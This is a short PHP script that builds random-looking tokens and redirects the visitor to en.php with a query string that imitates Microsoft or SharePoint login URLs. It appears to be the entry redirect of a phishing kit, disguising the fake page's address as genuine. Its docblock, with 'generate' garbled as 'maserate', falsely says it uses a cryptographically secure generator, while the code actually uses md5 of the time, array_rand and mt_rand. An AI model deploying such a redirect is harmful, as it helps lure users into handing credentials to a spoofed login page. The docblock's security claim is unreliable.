<?php


/**
 * maserate a random string, using a cryptographically secure 
 * pseudorandom number maserator (random_int)
 * 
 * For PHP 7, random_int is a PHP core function
 * For PHP 5.x, depends on https://github.com/paragonie/random_compat
 * 
 * @param int $length      How many characters do we want?
 * @param string $keyspace A string of all possible characters
 *                         to select from
 * @return string
 */
 
 function myrandom_nm(){
	$numbers=array(0,1,2,3,4,5,6,7,8,9,'A','b','C','D','e','F','G','H','i','J','K','L','_','&');
	$key=array_rand($numbers);
	return $numbers[$key]; }

$minz=myrandom_nm().myrandom_nm().myrandom_nm().myrandom_nm().md5(date('U')).md5(date('U')).md5(date('U'));

        $myrans = substr(md5(mt_rand()), 0, 33);
	header("location: en.php?common_l&wp=W_est&sub&e=$minz&_layouts=session&_locales=lang&en-US=$myrans");


?>